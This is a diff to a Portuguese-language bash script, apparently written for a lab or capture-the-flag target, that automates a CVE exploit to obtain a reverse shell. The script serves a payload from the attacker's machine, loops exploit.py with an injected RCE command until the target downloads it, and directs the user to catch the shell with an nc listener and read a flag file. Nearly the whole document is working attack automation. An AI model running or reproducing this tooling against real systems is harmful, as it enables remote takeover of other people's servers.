@@ -2,18 +2,17 @@
 # run_shell.sh — CVE-2026-109618 → Reverse Shell automatizado
 #
 # Uso:
-#   ./run_shell.sh                    → usa $IP ou 192.168.127.10
-#   ./run_shell.sh <target> [porta]   → target e porta específicos
+#   Terminal 1:  nc -lvnp 4444
+#   Terminal 2:  ./run_shell.sh [TARGET_IP] [PORTA]
 #
-# Requisitos: exploit.py no mesmo diretório, python3, nc
+# Requisitos: exploit.py no mesmo diretório, python3
 #
-# O script faz tudo sozinho:
+# O script:
 #   1. Detecta o IP do Kali
 #   2. Gera payload de reverse shell
 #   3. Sobe HTTP server para servir o payload
-#   4. Abre nc listener (foreground) — aguarda a conexão
-#   5. Roda o exploit em loop em background até ter sucesso
-#   6. Quando o exploit acerta, o shell aparece no terminal
+#   4. Roda o exploit em loop com feedback por tentativa
+#   5. Quando o exploit acerta, o shell aparece no terminal do nc
 
 set -u
 
@@ -32,11 +31,6 @@ CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'
 # ─── Verificações ────────────────────────────────────────────
 if [ ! -f "$EXPLOIT" ]; then
     echo -e "${RED}[!] exploit.py não encontrado em $SCRIPT_DIR${NC}"
-    exit 1
-fi
-
-if ! command -v nc &>/dev/null; then
-    echo -e "${RED}[!] nc (netcat) não instalado${NC}"
     exit 1
 fi
 
@@ -109,36 +103,68 @@ if [ "$RCE_LEN" -gt 48 ]; then
     exit 1
 fi
 
-# ─── Exploit loop em BACKGROUND ──────────────────────────────
-echo -e "${YELLOW}[*]${NC} Exploit rodando em background (até $MAX_ATTEMPTS tentativas)"
-echo -e "${YELLOW}[*]${NC} Aguardando reverse shell..."
-echo ""
-echo -e "  Comandos úteis quando o shell conectar:"
-echo -e "    ${BOLD}whoami${NC}                   → usuário no target"
-echo -e "    ${BOLD}id${NC}                       → uid/gid"
-echo -e "    ${BOLD}hostname${NC}                 → nome do servidor"
-echo -e "    ${BOLD}cat /var/www/proof.txt${NC}   → flag"
+echo -e "${YELLOW}[!]${NC} Certifique-se de que ${BOLD}nc -lvnp $LPORT${NC} está rodando em outro terminal!"
 echo ""
 
-(
-    for i in $(seq 1 $MAX_ATTEMPTS); do
-        python3 "$EXPLOIT" \
-            --host "$TARGET" --port "$TPORT" \
-            --rce "$RCE_CMD" \
-            &> "$TMP/exploit_$i.log"
+# ─── Exploit loop com feedback ───────────────────────────────
+echo -e "${YELLOW}[*]${NC} Rodando exploit (até $MAX_ATTEMPTS tentativas)..."
+echo ""
 
-        # Se o HTTP server recebeu GET /r, o exploit deu certo — para
+SUCCESS=0
+for i in $(seq 1 $MAX_ATTEMPTS); do
+    printf "  [%2d/%d] " "$i" "$MAX_ATTEMPTS"
+
+    python3 "$EXPLOIT" \
+        --host "$TARGET" --port "$TPORT" \
+        --rce "$RCE_CMD" \
+        &> "$TMP/exploit_$i.log"
+
+    # Verifica se o HTTP server recebeu GET /r (= target baixou o payload)
+    if grep -q "GET /r" "$TMP/http.log" 2>/dev/null; then
+        echo -e "${GREEN}EXPLOIT DEU CERTO! Verifique o terminal do nc.${NC}"
+        SUCCESS=1
+        break
+    fi
+
+    # Feedback baseado na saída do exploit
+    LAST=$(tail -1 "$TMP/exploit_$i.log" 2>/dev/null)
+    if echo "$LAST" | grep -q "normal-size cookie"; then
+        echo -e "leak falhou ${YELLOW}(cookie normal)${NC}"
+    elif echo "$LAST" | grep -q "RuntimeError\|Traceback"; then
+        echo -e "${RED}erro (target se recuperando)${NC}"
+    elif echo "$LAST" | grep -q "response=0"; then
+        echo "RCE enviado, verificando..."
+        sleep 3
         if grep -q "GET /r" "$TMP/http.log" 2>/dev/null; then
+            echo -e "  ${GREEN}EXPLOIT DEU CERTO! Verifique o terminal do nc.${NC}"
+            SUCCESS=1
             break
         fi
+    elif echo "$LAST" | grep -q "candidates=0"; then
+        echo -e "leak falhou ${YELLOW}(sem candidates)${NC}"
+    else
+        echo "sem sucesso: $(echo "$LAST" | head -c 60)"
+    fi
 
-        sleep 3
-    done
-) &
-EXPLOIT_PID=$!
+    sleep 3
+done
 
-# ─── nc listener em FOREGROUND — já escutando quando o exploit rodar ──
-nc -lvnp $LPORT
-
-echo ""
-echo -e "${CYAN}[*]${NC} Shell encerrado."
+if [ $SUCCESS -eq 1 ]; then
+    echo ""
+    echo -e "${GREEN}════════════════════════════════════════════════${NC}"
+    echo -e "${GREEN}  SHELL CONECTADO! Vá para o terminal do nc.${NC}"
+    echo -e "${GREEN}════════════════════════════════════════════════${NC}"
+    echo ""
+    echo -e "  Comandos úteis:"
+    echo -e "    ${BOLD}whoami${NC}                   → usuário no target"
+    echo -e "    ${BOLD}id${NC}                       → uid/gid"
+    echo -e "    ${BOLD}hostname${NC}                 → nome do servidor"
+    echo -e "    ${BOLD}cat /var/www/proof.txt${NC}   → flag"
+    echo -e "    ${BOLD}uname -a${NC}                 → kernel"
+else
+    echo ""
+    echo -e "${RED}[-] $MAX_ATTEMPTS tentativas esgotadas.${NC}"
+    echo "    Verifique: curl http://$TARGET:$TPORT/"
+    echo "    O target pode precisar de reinício."
+    exit 1
+fi
